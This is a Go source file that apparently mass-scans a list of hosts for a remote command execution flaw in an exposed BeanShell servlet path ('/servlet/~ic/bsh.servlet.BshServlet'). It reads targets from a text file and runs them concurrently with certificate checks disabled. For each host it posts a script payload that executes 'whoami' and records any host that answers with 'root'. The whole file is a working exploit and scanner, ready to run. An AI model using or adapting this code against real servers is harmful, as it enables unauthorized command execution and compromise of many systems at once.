package main
//icon_hash="1085941792"
import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"runtime"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

func wite(url string){//创建并写入文件夹
	f, err := os.OpenFile("ok.txt", os.O_APPEND, 0666)
	if err != nil{
		_, err = os.Create("ok.txt")
		return
	}
	_, err =io.WriteString(f, url + "\n")


}
func Http(url string){
	Url := url + "/servlet/~ic/bsh.servlet.BshServlet"
	timeout := 6 * time.Second
	client := &http.Client{Timeout: timeout}
	resp, err := client.Post(
		Url,
		"application/x-www-form-urlencoded",
		strings.NewReader("bsh.script=exec%28%22whoami%22%29%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A&bsh.servlet.output=raw"),
	)
	if err != nil{
		fmt.Println(url + " >>> 请求失败")
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	if resp.StatusCode == 200 && !strings.HasPrefix(string(body), "<!DOCTYPE"){
		ret6 := regexp.MustCompile(`root`)
		alls6 := ret6.FindAllString(string(body), -1)
		if alls6 != nil{
			s := url + " >>> " + alls6[0]
			wite(s)
			fmt.Println(s)
		}
	}else {
		fmt.Println(url + " >>> 不存在漏洞")
		return
	}
}
func Https(url string){
	Url := url + "/servlet/~ic/bsh.servlet.BshServlet"
	timeout := 5 * time.Second
	//忽略https证书
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: timeout}
	resp, err := client.Post(
		Url,
		"application/x-www-form-urlencoded",
		strings.NewReader("bsh.script=exec%28%22whoami%22%29%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A&bsh.servlet.output=raw"),
	)
	if err != nil{
		fmt.Println(url + "请求失败")
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	if resp.StatusCode == 200 && !strings.HasPrefix(string(body), "<!DOCTYPE"){
		ret6 := regexp.MustCompile(`root`)
		alls6 := ret6.FindAllString(string(body), -1)
		if alls6 != nil{
			s := url + " >>> " + alls6[0]
			wite(s)
			fmt.Println(s)
		}
	}else {
		fmt.Println(url + " >>> 不存在漏洞")
		return
	}
}

func Url(url <- chan string, wg *sync.WaitGroup){
	for url := range url{
		if !strings.HasPrefix(url, "https"){
				Http("http://" + url)
		}else{
			Https(url)
		}
	}
	wg.Done()
}

func main(){
	max := runtime.NumCPU() * 5
	var wg sync.WaitGroup
	wg.Add(max)
	ch := make(chan string)
	for i := 0; i < max; i++{
		go Url(ch, &wg)
	}
	file, err := os.Open("1.txt")
	if err != nil{
		fmt.Println("文件打开失败", err)
		os.Exit(0)
	}
	defer file.Close()
	buf := bufio.NewScanner(file)
	for buf.Scan(){
		ch <- buf.Text()
	}
	close(ch)
	wg.Wait()
}
